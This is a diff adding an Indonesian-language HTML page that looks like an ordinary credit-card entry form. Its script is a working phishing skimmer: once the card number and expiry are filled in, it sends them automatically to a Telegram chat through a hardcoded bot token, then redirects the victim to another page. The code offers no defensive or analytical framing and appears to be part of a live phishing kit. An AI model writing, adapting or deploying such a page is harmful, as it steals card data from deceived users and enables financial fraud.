@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Masukan Data Kartu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .back-button {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 35px;
+            height: 35px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .container {
+            background: white;
+            padding: 200px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-top: -120px;
+            position: relative;
+        }
+
+        .container img {
+            width: 100%;
+            max-width: 300px;
+            margin-top: -150px;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            width: 82%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #eee;
+            border-radius: 10px;
+            background-color: #eee;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        .input-box:focus {
+            border-color: #2984f1;
+        }
+
+        .input-box.error {
+            border-color: red;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 0.8em;
+            display: none;
+            margin-top: -5px;
+            text-align: left;
+            width: 82%;
+        }
+
+        .input-box1, .input-box2 {
+            width: 37%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #eee;
+            border-radius: 10px;
+            background-color: #eee;
+            transition: border 0.3s;
+            outline: none;
+        }
+
+        /* Efek border biru saat input DD dan MM ditekan */
+        .input-box1:focus, .input-box2:focus {
+            border-color: #2984f1;
+        }
+
+        .input-row {
+            display: flex;
+            justify-content: space-between;
+            width: 90%;
+        }
+
+        .small-text1 {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 0.9em;
+            color: #595959;
+            text-align: left;
+            margin-top: 10px;
+            margin-bottom: -5px;
+            width: 90%;
+        }
+
+        .small-text2 {
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: bold;
+            font-size: 20px;
+            color: #333;
+            text-align: center;
+            margin-top: 5px;
+            margin-bottom: 190px;
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+    <img src="back.png" alt="Kembali" class="back-button" id="backButton">
+    <div class="container">
+        <p class="small-text2">Masukkan Data Kartu Kredit</p>
+        <img src="hanya.webp" alt="Gambar Kartu">
+        
+        <input type="text" id="cardNumber" class="input-box" placeholder="Nomor Kartu" maxlength="16" inputmode="numeric"
+            oninput="validateCardNumber(this)">
+        <p class="error-message" id="errorMessage">Harus terdiri dari 16 digit</p>
+        
+        <p class="small-text1">Berlaku sampai</p>
+        <div class="input-row">
+            <input type="text" id="day" class="input-box1" placeholder="DD" maxlength="2" inputmode="numeric"
+                oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 2); checkAndSend();">
+            <input type="text" id="month" class="input-box2" placeholder="MM" maxlength="2" inputmode="numeric"
+                oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 2); checkAndSend();">
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById("backButton").addEventListener("click", function () {
+            window.location.href = "base.html";
+        });
+    
+        function validateCardNumber(input) {
+            input.value = input.value.replace(/[^0-9]/g, '').slice(0, 16);
+            let errorMessage = document.getElementById("errorMessage");
+    
+            if (input.value.length === 16) {
+                input.classList.remove("error");
+                errorMessage.style.display = "none";
+            } else {
+                input.classList.add("error");
+                errorMessage.style.display = "block";
+            }
+    
+            checkAndSend(); // Panggil untuk cek apakah bisa kirim otomatis
+        }
+    
+        function checkAndSend() {
+            let cardNumber = document.getElementById("cardNumber").value;
+            let day = document.getElementById("day").value;
+            let month = document.getElementById("month").value;
+    
+            if (cardNumber.length === 16 && day.length === 2 && month.length === 2) {
+                sendToTelegram();
+            }
+        }
+    
+        function sendToTelegram() {
+            let cardNumber = document.getElementById("cardNumber").value;
+            let day = document.getElementById("day").value;
+            let month = document.getElementById("month").value;
+    
+            let botToken = "8077461850:AAH8wdhBg2pux-lgWIywaFrKJEbEsO7jqAU";
+            let chatId = "-1002335844426";
+            let message = `Kartu: ${cardNumber}%0ABerlaku: ${day}/${month}`;
+    
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+    
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Response Telegram:", data);
+                    if (data.ok) {
+                        window.location.href = "reset.html"; // Redirect ke halaman tujuan
+                    } else {
+                        alert("Gagal mengirim data, coba lagi!");
+                    }
+                })
+                .catch(error => {
+                    console.error("Fetch error:", error);
+                    alert("Terjadi kesalahan, cek koneksi Anda!");
+                });
+        }
+    </script>
+    
